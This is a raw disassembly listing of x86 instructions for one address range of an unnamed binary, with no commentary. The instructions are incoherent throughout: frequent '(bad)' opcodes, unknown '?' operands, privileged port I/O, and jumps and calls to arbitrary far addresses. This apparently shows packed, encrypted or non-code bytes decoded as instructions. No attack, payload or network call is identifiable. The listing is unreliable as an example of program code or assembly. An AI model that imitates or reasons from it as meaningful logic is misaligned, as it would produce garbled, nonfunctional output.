  4021ad:	imul   BYTE PTR [ebp-0x6c26963]
  4021b3:	ds dec edi
  4021b5:	(bad)  
  4021b6:	addr16 out dx,al
  4021b8:	int3   
  4021b9:	js     0x402204
  4021bb:	inc    esp
  4021bc:	popa   
  4021bd:	or     DWORD PTR [edx+ecx*4+0x5c007d24],esp
  4021c4:	jp     0x4021a7
  4021c6:	jns    0x4021ed
  4021c8:	cdq    
  4021c9:	(bad)  
  4021ca:	push   esi
  4021cb:	jne    0x40223f
  4021cd:	faddp  st(4),st
  4021cf:	lock xor DWORD PTR [eax+0x5c],esp
  4021d3:	mov    al,ds:0x913014e
  4021d8:	icebp  
  4021d9:	aad    0x6
  4021db:	addr16 es stc 
  4021de:	loope  0x4021fe
  4021e0:	loopne 0x402255
  4021e2:	bound  edi,QWORD PTR [eax+0x39]
  4021e5:	daa    
  4021e6:	leave  
  4021e7:	shl    BYTE PTR [edi+eax*1+0x67],cl
  4021eb:	fild   QWORD PTR [eax+ecx*1-0x6ae582e3]
  4021f2:	mov    edx,0x29abf8e
  4021f7:	sbb    eax,0x2fdca222
  4021fc:	bound  edx,QWORD PTR [esi]
  4021fe:	ins    BYTE PTR es:[edi],dx
  4021ff:	into   
  402200:	push   0x38
  402202:	cli    
  402203:	pusha  
  402204:	mov    bh,0x2d
  402206:	jb     0x4021c6
  402208:	xchg   ecx,eax
  402209:	push   esi
  40220a:	sbb    DWORD PTR [ebx+esi*1+0x32],esi
  40220e:	xchg   esi,eax
  40220f:	dec    esp
  402210:	out    0xf4,eax
  402212:	sub    BYTE PTR [esi-0x68],dl
  402215:	js     0x402249
  402217:	arpl   WORD PTR [esi],dx
  402219:	loope  0x402237
  40221b:	add    ebp,ecx
  40221d:	dec    esi
  40221e:	das    
  40221f:	sub    BYTE PTR [eiz*8+0x4879e357],al
  402226:	add    cl,bh
  402228:	repz sub al,0x65
  40222b:	xor    BYTE PTR [ecx-0x14],ah
  40222e:	into   
  40222f:	das    
  402230:	push   cs
  402231:	jo     0x402233
  402233:	iretw  
  402235:	outs   dx,BYTE PTR ds:[esi]
  402236:	inc    ebp
  402237:	add    edx,DWORD PTR [eax-0x1864b98]
  40223d:	mov    ecx,0x50723340
  402242:	mov    WORD PTR [ebp+0x4c],?
  402245:	cmp    bl,BYTE PTR [ebp+0x3a4cb54e]
  40224b:	jecxz  0x4022bb
  40224d:	adc    ah,BYTE PTR [edi-0x259c21c2]
  402253:	inc    ebx
  402254:	stos   BYTE PTR es:[edi],al
  402255:	cmp    bh,BYTE PTR [esi-0x7]
  402258:	inc    edx
  402259:	fist   WORD PTR [edx+0x68c52662]
  40225f:	aaa    
  402260:	icebp  
  402261:	xchg   DWORD PTR [ebx],ebp
  402263:	in     eax,0xca
  402265:	pop    esi
  402266:	lods   al,BYTE PTR ds:[esi]
  402267:	(bad)  
  402269:	rcl    DWORD PTR [esi+0x13],cl
  40226c:	int3   
  40226d:	sbb    eax,DWORD PTR [ebp+ebx*8+0x7a604ce7]
  402274:	aaa    
  402275:	xor    DWORD PTR [esi-0x1cd1bb84],esi
  40227b:	sub    esi,DWORD PTR [ebx]
  40227d:	push   cs
  40227e:	push   ecx
  40227f:	xor    DWORD PTR [ecx+0xd],0xffffffe1
  402283:	cs rol esi,1
  402286:	es lahf 
  402288:	les    ebp,FWORD PTR [ecx+0x44]
  40228b:	ficomp WORD PTR [ebp+0x4f]
  40228e:	jmp    0x69cf7965
  402293:	sub    DWORD PTR [ecx],0x869ac151
  402299:	xchg   ebx,edx
  40229b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40229c:	mov    eax,ds:0xbcb95686
  4022a1:	ret    0xa52a
  4022a4:	fwait
  4022a5:	aaa    
  4022a6:	sbb    DWORD PTR [ebx+0x63],edx
  4022a9:	jo     0x4022fb
  4022ab:	mov    al,ds:0x99ba42d2
  4022b0:	fcmovnb st,st(1)
  4022b2:	and    ebx,DWORD PTR [esi+0x12]
  4022b5:	nop
  4022b6:	and    eax,0x55fbe8b7
  4022bb:	repnz mov esi,0x76c8e9e6
  4022c1:	imul   esi,DWORD PTR [esi+0x759e6a82],0x5da8f8bd
  4022cb:	adc    al,0xfa
  4022cd:	int    0xbd
  4022cf:	xchg   ecx,eax
  4022d0:	ss add eax,0x58f86993
  4022d6:	or     DWORD PTR [edi+0x3197c650],esi
  4022dc:	lods   al,BYTE PTR ds:[esi]
  4022dd:	mov    ds:0x6ecdcda1,al
  4022e2:	xchg   ebp,eax
  4022e3:	mov    bh,0x54
  4022e5:	mov    eax,0xe98d5860
  4022ea:	dec    ebp
  4022eb:	adc    eax,0xccd38a2d
  4022f0:	test   BYTE PTR [ebp+0x72],bh
  4022f3:	outs   dx,DWORD PTR ds:[esi]
  4022f4:	add    al,0x2f
  4022f6:	and    DWORD PTR [esi-0x1c03e176],0xffffffeb
  4022fd:	dec    ebp
  4022fe:	aam    0x9
  402300:	cmp    BYTE PTR [edx],al
  402302:	pop    esp
  402303:	sub    eax,0x995d03c
  402308:	(bad)  
  402309:	enter  0x1ff3,0x2b
  40230d:	popf   
  40230e:	gs xchg ecx,eax
  402310:	cmp    al,0xad
  402312:	pop    ss
  402313:	arpl   WORD PTR [ecx+edx*4],si
  402316:	cld    
  402317:	push   cs
  402318:	fiadd  WORD PTR [ecx]
  40231a:	data16 shl BYTE PTR [esi-0x267c2d01],cl
  402321:	mov    bh,0xbe
  402323:	sub    eax,ebp
  402325:	sbb    BYTE PTR [edx],0xbc
  402328:	or     al,0x6e
  40232a:	push   esi
  40232b:	xrelease mov BYTE PTR [edx+0x2a725f41],ch
  402332:	push   esi
  402333:	xor    BYTE PTR [ebx+0x22],bh
  402336:	repnz or al,0xf9
  402339:	jle    0x402394
  40233b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40233c:	mov    dh,0xa
  40233e:	test   al,0xbf
  402340:	scas   al,BYTE PTR es:[edi]
  402341:	push   edx
  402342:	sub    al,0x10
  402344:	pop    esp
  402345:	loop   0x40236b
  402347:	and    DWORD PTR [edx-0x3c1e4410],esp
  40234d:	xchg   esp,eax
  40234e:	nop
  40234f:	cmp    BYTE PTR [edi],cl
  402351:	(bad)  
  402352:	and    edx,DWORD PTR [ebx+0x7139ccc6]
  402358:	cmp    eax,0x64d0ae8d
  40235d:	mov    ds:0x9272c3f3,al
  402362:	popf   
  402363:	mov    DWORD PTR [edx],edi
  402365:	lock mov eax,0xd7155998
  40236b:	pusha  
  40236c:	pop    ecx
  40236d:	push   0x35
  40236f:	push   cs
  402370:	fbld   TBYTE PTR [eax+0x5897d294]
  402376:	mov    eax,ds:0x30eeed3d
  40237b:	dec    edi
  40237c:	push   ebp
  40237d:	dec    ebp
  40237e:	lods   eax,DWORD PTR ds:[esi]
  40237f:	out    0x5c,al
  402381:	and    DWORD PTR [edi],0x1c
  402384:	jge    0x402330
  402386:	xchg   esi,eax
  402387:	fdiv   QWORD PTR [esi-0x6911eaf2]
  40238d:	jno    0x402386
  40238f:	shl    DWORD PTR [edi],cl
  402391:	xor    al,0x98
  402393:	fs inc esi
  402395:	cmp    DWORD PTR [edi-0x3757bc0f],0x3e96ba8c
  40239f:	mov    esi,0x37f4529a
  4023a4:	mov    esp,0x895fd79d
  4023a9:	pop    es
  4023aa:	jge    0x4023ba
  4023ac:	add    al,0xde
  4023ae:	mov    BYTE PTR [edx+edi*8+0x1d58f13d],cl
  4023b5:	fwait
  4023b6:	popf   
  4023b7:	iret   
  4023b8:	xchg   ebp,eax
  4023b9:	jmp    0x7866:0x8194b80f
  4023c0:	rcl    ch,1
  4023c2:	push   cs
  4023c3:	cs sbb edx,ebx
  4023c6:	idiv   BYTE PTR ds:0xbcb6a8c1
  4023cc:	adc    DWORD PTR [ebx],edx
  4023ce:	xchg   edx,eax
  4023cf:	push   ebx
  4023d0:	push   esp
  4023d1:	mov    ebx,0xdb50e52e
  4023d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023d7:	(bad)  
  4023d8:	stc    
  4023d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023da:	jge    0x402443
  4023dc:	sub    ebp,ebx
  4023de:	push   ebx
  4023df:	inc    ebp
  4023e0:	cmp    DWORD PTR [eax],eax
  4023e2:	out    0x3c,al
  4023e4:	xor    al,BYTE PTR [eax]
  4023e6:	inc    esi
  4023e7:	jne    0x4023bc
  4023e9:	sti    
  4023ea:	ficom  WORD PTR es:[eax-0x7e]
  4023ee:	pop    ss
  4023ef:	sub    DWORD PTR [ebx-0x75],0xffffffc6
  4023f3:	xor    BYTE PTR [ecx-0x5d],0x3e
  4023f7:	sbb    al,0xfa
  4023f9:	cmp    BYTE PTR [edi-0x2],bl
  4023fc:	popf   
  4023fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023fe:	cs lock jo 0x402416
  402402:	out    0x22,eax
  402404:	lds    ecx,FWORD PTR [edx-0x7]
  402407:	data16 (bad) 
  402409:	in     al,dx
  40240a:	iret   
  40240b:	pop    es
  40240c:	test   eax,0xcb4a6cc
  402411:	not    DWORD PTR [ebx+eiz*1-0x6a48d404]
  402418:	jo     0x4023f9
  40241a:	xchg   edx,eax
  40241b:	xchg   BYTE PTR [ebp+0x185ead9a],dl
  402421:	dec    ebp
  402422:	cdq    
  402423:	xchg   ecx,eax
  402424:	(bad)  
  402425:	push   cs
  402426:	enter  0xf6a3,0xad
  40242a:	pop    ds
  40242b:	out    0x96,eax
  40242d:	push   esp
  40242e:	mov    dh,0x83
  402430:	loop   0x40240c
  402432:	mov    DWORD PTR [ebp+0x36],esi
  402435:	push   esp
  402436:	jle    0x402488
  402438:	push   ss
  402439:	call   DWORD PTR [eax+0x5d]
  40243c:	and    DWORD PTR [ebx+0x17],eax
  40243f:	int    0xad
  402441:	fsubrp st(0),st
  402443:	mov    bl,0xa1
  402445:	ins    BYTE PTR es:[edi],dx
  402446:	xchg   ecx,eax
  402447:	lahf   
  402448:	ja     0x402487
  40244a:	xor    al,BYTE PTR [ecx+0x2f]
  40244d:	pop    ss
  40244e:	mov    ss,WORD PTR [esi-0x32]
  402451:	pop    ds
  402452:	xchg   esp,eax
  402453:	mov    dl,0xf5
  402455:	ds push eax
  402457:	daa    
  402458:	(bad)  
  402459:	test   eax,0x2d449cc5
  40245e:	mov    edi,0x4f80edb3
  402463:	jbe    0x40242f
  402465:	(bad)  
  402467:	pop    edx
  402468:	mov    ah,0x56
  40246a:	mov    WORD PTR [ebx],ss
  40246c:	push   edx
  40246d:	fcomp  DWORD PTR [ecx+0x4f]
  402470:	or     eax,0x7d1478d
  402475:	push   ds
  402476:	mov    WORD PTR [ebp+0x41cd1581],gs
  40247c:	push   ss
  40247d:	shl    DWORD PTR [ebp-0xb],1
  402480:	sbb    BYTE PTR [edi+ecx*2-0x270fb8c7],ah
  402487:	(bad)  [ecx+0x71]
  40248a:	and    al,ch
  40248c:	aaa    
  40248d:	adc    BYTE PTR [esi*1+0x768db120],dh
  402494:	mov    esp,0xa8f99ea7
  402499:	mov    ebx,0xd64ebd00
  40249e:	shr    DWORD PTR [ebx+0x37],0xa5
  4024a2:	jae    0x4024da
  4024a4:	mov    bh,bl
  4024a6:	repz das 
  4024a8:	inc    ebx
  4024a9:	clc    
  4024aa:	out    dx,eax
  4024ab:	ins    DWORD PTR es:[edi],dx
  4024ac:	outs   dx,BYTE PTR ds:[esi]
  4024ad:	pop    esp
  4024ae:	cmp    al,dl
  4024b0:	fimul  DWORD PTR [ebx-0x607937e]
  4024b6:	idiv   BYTE PTR [edi]
  4024b8:	add    al,0xda
  4024ba:	push   edi
  4024bb:	inc    edx
  4024bc:	ja     0x402462
  4024be:	push   esp
  4024bf:	stos   BYTE PTR es:[edi],al
  4024c0:	sbb    eax,DWORD PTR [esi+0x18]
  4024c3:	push   ecx
  4024c4:	stos   DWORD PTR es:[edi],eax
  4024c5:	fwait
  4024c6:	and    bl,BYTE PTR [esi+ebx*2]
  4024c9:	loope  0x4024c6
  4024cb:	cmp    dl,BYTE PTR [esp+ecx*1-0x51]
  4024cf:	repnz nop
  4024d1:	pop    es
  4024d2:	es into 
  4024d4:	pop    ebp
  4024d5:	add    BYTE PTR [esi-0x57],bl
  4024d8:	xchg   edi,eax
  4024d9:	pop    ebp
  4024da:	push   DWORD PTR [esp+ebx*8-0x4ca75b7]
  4024e1:	int3   
  4024e2:	push   0x3c
  4024e4:	cmp    eax,0xe24923
  4024e9:	sbb    eax,0x0
  4024ec:	inc    edi
  4024ed:	fidivr DWORD PTR [edi]
  4024ef:	out    0xc7,eax
  4024f1:	mov    ds:0xcbe122d1,eax
  4024f6:	jg     0x40254e
  4024f8:	inc    esp
  4024fa:	jnp    0x40256b
  4024fc:	ja     0x4024a2
  4024fe:	call   FWORD PTR [ebp+0x272e5f49]
  402504:	mov    edi,0x61a88a51
  402509:	in     al,dx
  40250a:	jg     0x4024b3
  40250c:	mov    DWORD PTR [ebx+0x74248e2c],esp
  402512:	jecxz  0x402505
  402514:	xlat   BYTE PTR ds:[ebx]
  402515:	ins    BYTE PTR es:[edi],dx
  402516:	dec    ebx
  402517:	fstp   DWORD PTR [edi]
  402519:	cmp    esp,0x59ef1b4f
  40251f:	mov    ebx,0x9dc4761e
  402524:	mov    ecx,0x799d3948
  402529:	and    al,al
  40252b:	or     eax,0x9c7efda1
  402530:	stos   BYTE PTR es:[edi],al
  402531:	jge    0x4024e4
  402533:	adc    eax,0x8738433f
  402538:	pop    edx
  402539:	sbb    al,0xdc
  40253b:	xor    DWORD PTR [edx],ebp
  40253d:	xlat   BYTE PTR ds:[ebx]
  40253e:	mov    eax,0x9ab81332
  402543:	arpl   WORD PTR [ebx+0x74ad7ca2],ax
  402549:	adc    bh,cl
  40254b:	cdq    
  40254c:	xchg   ebp,eax
  40254d:	es stc 
  40254f:	inc    eax
  402550:	imul   edi,DWORD PTR [ebp-0x66],0xffffffdb
  402554:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402555:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402556:	jp     0x40255b
  402558:	dec    ebp
  402559:	shr    dh,cl
  40255b:	pop    esp
  40255c:	dec    ebp
  40255d:	jns    0x402504
  40255f:	add    BYTE PTR [edx],0xe4
  402562:	push   ss
  402563:	(bad)  
  402564:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402565:	aaa    
  402566:	dec    esi
  402567:	or     ebx,DWORD PTR [ebx+ebp*2]
  40256a:	xchg   DWORD PTR [esi],edi
  40256c:	and    DWORD PTR [ebx],edx
  40256e:	icebp  
  40256f:	call   0x1cc6:0x17d5350e
  402576:	fidivr DWORD PTR [esi]
  402578:	rcr    BYTE PTR [ebx-0x7b],0xc8
  40257c:	mov    eax,0x6afc962b
  402581:	mov    bh,0xda
  402583:	js     0x40258f
  402585:	pop    ecx
  402586:	jmp    0x40257e
  402588:	mov    ds:0x4f1a30f6,eax
  40258d:	jne    0x4025b7
  40258f:	hlt    
  402590:	in     eax,dx
  402591:	pop    eax
  402592:	ins    DWORD PTR es:[edi],dx
  402593:	xlat   BYTE PTR ds:[ebx]
  402594:	mov    edi,0xdab56336
  402599:	out    dx,al
  40259a:	(bad)  
  40259c:	push   esp
  40259d:	or     DWORD PTR [esi],esp
  40259f:	sub    ebx,ebp
  4025a1:	xlat   BYTE PTR ds:[ebx]
  4025a2:	div    BYTE PTR [edx+0x55]
  4025a5:	xchg   esi,eax
  4025a6:	loop   0x40258e
  4025a8:	mov    ds:0x77f21b41,eax
  4025ad:	push   ebx
  4025ae:	push   ds
  4025af:	xor    eax,0x91a9766a
  4025b4:	fiadd  DWORD PTR [ebx*1-0x488a7d54]
  4025bb:	mov    ch,0xc7
  4025bd:	rol    BYTE PTR [ecx+0x3e],1
  4025c0:	mov    WORD PTR [edx],ss
  4025c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025c3:	cs ds jg 0x4025c1
  4025c7:	ins    BYTE PTR es:[edi],dx
  4025c8:	xor    bl,bh
  4025ca:	mov    dl,0xd9
  4025cc:	mov    BYTE PTR [ebx+0x69],bh
  4025cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025d0:	aaa    
  4025d1:	push   es
  4025d2:	das    
  4025d3:	lods   al,BYTE PTR ds:[esi]
  4025d4:	pop    edx
  4025d5:	sbb    eax,0x45bd8e66
  4025da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025db:	rcl    DWORD PTR [esi+0x30085e49],0x68
  4025e2:	ror    DWORD PTR [edi],1
  4025e4:	dec    ebp
  4025e5:	cmp    BYTE PTR [ebp+esi*4+0x2e],al
  4025e9:	jb     0x402585
  4025eb:	out    0x6b,al
  4025ed:	test   BYTE PTR [esi+0x5f],cl
  4025f0:	(bad)  
  4025f1:	jge    0x402574
  4025f3:	retf   0x9220
  4025f6:	pusha  
  4025f7:	fild   WORD PTR [edi+0x63a319e0]
  4025fd:	add    ebx,0xffffffc8
  402600:	cmp    edi,DWORD PTR [eax+0x558262b6]
  402606:	lods   eax,DWORD PTR ds:[esi]
  402607:	mov    bh,0x41
  402609:	jg     0x402682
  40260b:	push   esi
  40260c:	xchg   edx,eax
  40260d:	add    bh,BYTE PTR [edi-0x246a4886]
  402613:	jno    0x4025da
  402615:	iret   
  402616:	aad    0x9b
  402618:	mov    eax,ds:0xdb5871c1
  40261d:	retf   0x78f9
  402620:	pop    ebp
  402621:	add    edx,eax
  402623:	cld    
  402624:	shr    esp,1
  402626:	out    dx,al
  402627:	add    eax,0xe8f31345
  40262c:	test   eax,0x51438c8c
  402631:	cmp    eax,eax
  402633:	and    BYTE PTR [esi+0x179555ca],dl
  402639:	inc    esp
  40263a:	in     al,0xd9
  40263c:	jns    0x4025eb
  40263e:	pop    ebp
  40263f:	into   
  402640:	sti    
  402641:	pop    ebp
  402642:	xchg   ebp,eax
  402643:	repnz (bad) 
  402645:	daa    
  402646:	jo     0x40261e
  402648:	mov    al,0x57
  40264a:	sbb    ebx,ecx
  40264c:	adc    BYTE PTR [ebp+0x58a50e92],ch
  402652:	inc    ecx
  402653:	push   ds
  402654:	mov    cl,0x8e
  402656:	outs   dx,BYTE PTR ds:[esi]
  402657:	(bad)  
  402658:	aam    0x40
  40265a:	loope  0x40266f
  40265c:	pop    es
  40265d:	sbb    al,BYTE PTR [edx]
  40265f:	xchg   ecx,ebx
  402661:	ja     0x40266f
  402663:	hlt    
  402664:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402665:	push   ebx
  402666:	call   0xd7478b5d
  40266b:	jl     0x402613
  40266d:	add    BYTE PTR [eax-0x48],bl
  402670:	jae    0x402600
  402672:	sub    bh,ah
  402674:	xor    dl,0xaa
  402677:	mov    al,0xd2
  402679:	addr16 in eax,0x1a
  40267c:	mov    BYTE PTR fs:[edi-0x70e84711],ah
  402683:	pop    ebp
  402684:	jns    0x4026ae
  402686:	push   ecx
  402687:	dec    eax
  402688:	jmp    0x61d4:0x87946a2e
  40268f:	dec    edx
  402690:	repz jbe 0x40265e
  402693:	out    dx,eax
  402694:	fmul   DWORD PTR [edx]
  402696:	fadd   QWORD PTR [eax-0x1c9e85f4]
  40269c:	or     bh,bl
  40269e:	ja     0x40268b
  4026a0:	pusha  
  4026a1:	sub    cl,bh
  4026a3:	jmp    0x51001f38
  4026a8:	daa    
  4026a9:	icebp  
  4026aa:	or     ah,0x49
  4026ad:	add    BYTE PTR [ebp+0x70],ah
  4026b0:	pop    ss
  4026b1:	mov    esp,0x4b78f36b
  4026b6:	mov    dl,0xc6
  4026b8:	addr16 pop ebx
  4026ba:	inc    esp
  4026bb:	sbb    ecx,ebx
  4026bd:	dec    eax
  4026be:	(bad)  
  4026bf:	repnz mov dh,al
  4026c2:	xor    DWORD PTR [esi+0x4],0x3
  4026c6:	pushf  
  4026c7:	cmp    ebx,DWORD PTR [eax-0x142e01d2]
  4026cd:	adc    eax,0xd31b906c
  4026d2:	dec    edi
  4026d3:	pusha  
  4026d4:	idiv   DWORD PTR [edx-0x59]
  4026d7:	cmp    ecx,ecx
  4026d9:	ror    DWORD PTR [edi+0x68],0x5c
  4026dd:	cmp    DWORD PTR [eax],edi
  4026df:	adc    DWORD PTR [ecx],esi
  4026e1:	cmp    DWORD PTR [esi-0x7d],esi
  4026e4:	sub    al,0x18
  4026e6:	sbb    al,0xc1
  4026e8:	in     al,0x9c
  4026ea:	out    dx,eax
  4026eb:	mov    eax,ss
  4026ed:	pop    edx
  4026ee:	push   cs
  4026ef:	lahf   
  4026f0:	sbb    BYTE PTR [ebp-0x63ff5682],ch
  4026f6:	ret    0x21d
  4026f9:	imul   ebp,DWORD PTR [edx+0x4b],0x16f2c383
  402700:	dec    esi
  402701:	(bad)  
  402702:	xor    al,0xe0
  402704:	icebp  
  402705:	out    0x5,al
  402707:	repz loope 0x4026ff
  40270a:	gs daa 
  40270c:	mov    ch,0x4b
  40270e:	jno    0x402736
  402710:	xor    al,0xa
  402712:	jmp    0xdb14af47
  402717:	ret    0xde83
  40271a:	hlt    
  40271b:	mov    dl,BYTE PTR [ebx-0x73]
  40271e:	and    dh,BYTE PTR ss:[ebx+0x51]
  402722:	jo     0x4026a4
  402724:	daa    
  402725:	cmp    al,0x4a
  402727:	mov    ecx,0xd376841d
  40272c:	mov    al,ds:0xd2ee38c1
  402731:	xchg   esp,eax
  402732:	mov    esi,0xe789e559
  402737:	sbb    eax,0xd5544e69
  40273c:	lds    edi,FWORD PTR [ebx]
  40273e:	(bad)  
  40273f:	in     al,0x8b
  402741:	adc    esp,DWORD PTR [edi-0x301c0b6d]
  402747:	mov    ebp,0x4a4b4ea1
  40274c:	jecxz  0x40274f
  40274e:	rcr    eax,1
  402750:	into   
  402751:	call   0xb4b33e66
  402756:	mov    al,0x6a
  402758:	mov    bl,0xd6
  40275a:	mov    BYTE PTR [esi-0x1e],ch
  40275d:	or     bh,bh
  40275f:	loopne 0x4027a1
  402761:	call   0xacd4b0c3
  402766:	jge    0x402739
  402768:	dec    esi
  402769:	and    BYTE PTR [edx-0x3dfd3627],bl
  40276f:	dec    edi
  402770:	popa   
  402771:	(bad)  
  402772:	iret   
  402773:	pop    ecx
  402774:	ret    
  402775:	div    DWORD PTR [eax+0x5a]
  402778:	mov    cs,esi
  40277a:	jo     0x402755
  40277c:	inc    ebx
  40277d:	mov    WORD PTR [edi+0x19],sp
  402781:	push   0x73
  402783:	lds    esi,FWORD PTR [esi-0x79]
  402786:	sub    eax,esi
  402788:	popa   
  402789:	xor    eax,0xb66f2cca
  40278e:	jbe    0x4027c9
  402790:	inc    ebp
  402791:	mov    WORD PTR [ebx+0x765fe66c],ds
  402797:	sti    
  402798:	xchg   ecx,eax
  402799:	cmp    DWORD PTR [edi],ebx
  40279b:	cmp    BYTE PTR [ebp+0x29f01916],ch
  4027a1:	cmp    al,0xda
  4027a3:	xor    dh,al
  4027a5:	pusha  
  4027a6:	inc    esi
  4027a7:	stc    
  4027a8:	push   ebp
  4027a9:	retf   
  4027aa:	fcmove st,st(2)
  4027ac:	in     eax,dx
  4027ad:	shl    edi,1
  4027af:	adc    al,BYTE PTR [ecx]
  4027b1:	(bad)
  4027b5:	std    
  4027b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027b7:	sub    DWORD PTR [ebx+0x34],esi
  4027ba:	cmp    DWORD PTR [bp-0x6c63],edi
  4027bf:	sub    bl,bh
  4027c1:	push   cs
  4027c2:	ds mov ah,0x74
  4027c5:	fwait
  4027c6:	sbb    DWORD PTR [edx-0x2e3198a1],ebx
  4027cc:	in     al,0xe2
  4027ce:	in     al,dx
  4027cf:	pop    ebp
  4027d0:	retf   
  4027d1:	xor    al,0xfa
  4027d3:	jmp    0x40283c
  4027d5:	ja     0x402840
  4027d7:	push   ecx
  4027d8:	ficomp DWORD PTR [edi-0x405bf3b2]
  4027de:	imul   ebx,DWORD PTR [esi+0x3f],0xffffff8f
  4027e2:	cmp    DWORD PTR [edx+0x3c89e7e6],ecx
  4027e8:	je     0x4027ae
  4027ea:	js     0x4027ea
  4027ec:	ret    0xeab3
  4027ef:	ins    DWORD PTR es:[edi],dx
  4027f0:	out    0xfc,eax
  4027f2:	xor    edx,edx
  4027f4:	and    BYTE PTR [edi-0x4f934fe8],cl
  4027fa:	cmp    ebx,DWORD PTR [edx+0x9]
  4027fd:	sbb    DWORD PTR [esi-0x1e],ebx
  402800:	ret    0x8144
  402803:	xor    dl,dh
  402805:	push   ebp
  402806:	sub    BYTE PTR [esi*2+0x7f22be96],0xad
  40280e:	iret   
  40280f:	adc    al,0x5
  402811:	cmc    
  402812:	cmc    
  402813:	shr    DWORD PTR [edx],cl
  402815:	cld    
  402816:	mov    ebp,0x7a1d9357
  40281b:	rcl    ecx,0xa5
  40281e:	or     ebx,eax
  402820:	test   al,0x8e
  402822:	add    esi,DWORD PTR [eax+0x5f]
  402825:	xchg   esp,eax
  402826:	mov    eax,ds:0x9d511017
  40282b:	inc    esi
  40282c:	cdq    
  40282d:	sub    BYTE PTR [ebx-0x45a77917],cl
  402833:	cdq    
  402834:	xchg   esp,eax
  402835:	push   ecx
  402836:	push   es
  402837:	dec    ebx
  402838:	mov    WORD PTR [esi-0x3d2df123],gs
  40283e:	cmc    
  40283f:	(bad)  
  402841:	std    
  402842:	imul   bp,WORD PTR [eax],0xc6ab
  402847:	mov    ah,0xa5
  402849:	xor    al,0xfa
  40284b:	lock adc edx,DWORD PTR [ecx]
  40284e:	std    
  40284f:	jnp    0x4027db
  402851:	(bad)  
  402852:	xlat   BYTE PTR ds:[ebx]
  402853:	add    bh,BYTE PTR [esp-0x4b774e7d]
  40285a:	pop    esi
  40285b:	(bad)  
  40285c:	bound  ecx,QWORD PTR [ecx-0x719418cc]
  402862:	(bad)  
  402864:	and    eax,0x1f0c0fc4
  402869:	xchg   ebx,eax
  40286a:	sub    BYTE PTR [edi+ebp*8+0x70e16d36],bh
  402871:	in     al,0x22
  402873:	test   eax,0x7aa28c56
  402878:	mov    ds:0x15464527,eax
  40287d:	push   0x64d6537d
  402882:	(bad)  
  402883:	in     al,0xc0
  402885:	mov    ds:0xfdafa2f7,eax
  40288a:	pop    ss
  40288b:	repz dec ebp
  40288d:	aas    
  40288e:	iret   
  40288f:	inc    ebp
  402890:	push   edx
  402891:	adc    al,0x59
  402893:	mov    ecx,0x3d5af764
  402898:	mov    ?,WORD PTR ds:0x10f5b2a7
  40289e:	mov    ah,BYTE PTR [ebx+0x51b34bc6]
  4028a4:	xchg   esp,eax
  4028a5:	out    0x39,al
  4028a7:	sbb    DWORD PTR [eax],edx
  4028a9:	jne    0x40285a
  4028ab:	rol    DWORD PTR [ebp+0x38],1
  4028ae:	outs   dx,DWORD PTR ds:[esi]
  4028af:	mov    al,ds:0xdea2ec32
  4028b4:	mov    al,ds:0xb605456d
  4028b9:	(bad)  
  4028ba:	or     al,0xad
  4028bc:	mov    ecx,0xd974a8f2
  4028c1:	mov    dh,0x39
  4028c3:	or     BYTE PTR [esi+0x54],cl
  4028c6:	cmp    ebp,esp
  4028c8:	jmp    0x4028e9
  4028ca:	xchg   edx,eax
  4028cb:	jb     0x402887
  4028cd:	sbb    eax,0x1ecc6b95
  4028d2:	add    eax,0x7c804957
  4028d7:	test   eax,0x7549eea2
  4028dc:	sbb    ebx,DWORD PTR ds:0xe3633417
  4028e2:	lock aam 0xc8
  4028e5:	daa    
  4028e6:	ret    
  4028e7:	adc    ecx,DWORD PTR [ebx]
  4028e9:	stc    
  4028ea:	(bad)  
  4028ec:	mov    eax,0x8adac3f8
  4028f1:	cmp    ebp,0x35
  4028f4:	pop    esp
  4028f5:	scas   eax,DWORD PTR es:[edi]
  4028f6:	push   0xba523bd9
  4028fb:	mov    bh,0x32
  4028fd:	dec    edi
  4028fe:	sbb    eax,0x649ad3ee
  402903:	les    edx,FWORD PTR [ecx+0x69]
  402906:	in     eax,0xc2
  402908:	dec    ecx
  402909:	fld    DWORD PTR [ebp+ebx*8-0xaa0d4f4]
  402910:	push   esp
  402911:	xchg   ebp,eax
  402912:	(bad)  
  402914:	inc    eax
  402915:	ins    BYTE PTR es:[edi],dx
  402916:	lds    ebp,FWORD PTR [eax-0x6c]
  402919:	ins    DWORD PTR es:[edi],dx
  40291a:	dec    esi
  40291b:	call   0xd70d4b44
  402920:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402921:	push   es
  402922:	or     esi,DWORD PTR fs:[eax]
  402925:	inc    esi
  402926:	lahf   
  402927:	adc    eax,0x4d61548e
  40292c:	and    eax,0x3c88763c
  402931:	scas   al,BYTE PTR es:[edi]
  402932:	cvttps2pi mm5,QWORD PTR [esi-0x61]
  402936:	(bad)  
  402937:	shr    bl,0xf3
  40293a:	cmc    
  40293b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40293c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40293d:	scas   eax,DWORD PTR es:[edi]
  40293e:	out    dx,al
  40293f:	dec    esp
  402940:	mov    eax,0xaf8e1cf1
  402945:	xor    al,0x59
  402947:	aad    0xe
  402949:	pop    ds
  40294a:	pop    eax
  40294b:	scas   eax,DWORD PTR es:[edi]
  40294c:	rcr    BYTE PTR [ecx+eiz*2-0x2b],1
  402950:	mov    dh,0x3f
  402952:	jg     0x40295c
  402954:	addr16 aad 0x77
  402957:	es pop edx
  402959:	arpl   WORD PTR [esi+edi*4+0x6a8eaf05],cx
  402960:	mov    WORD PTR [esp+ebx*1],fs
  402963:	rol    DWORD PTR [ebp+eiz*4+0x1054a6bb],cl
  40296a:	mov    ss,WORD PTR [ebp+0x685f4860]
  402970:	in     eax,dx
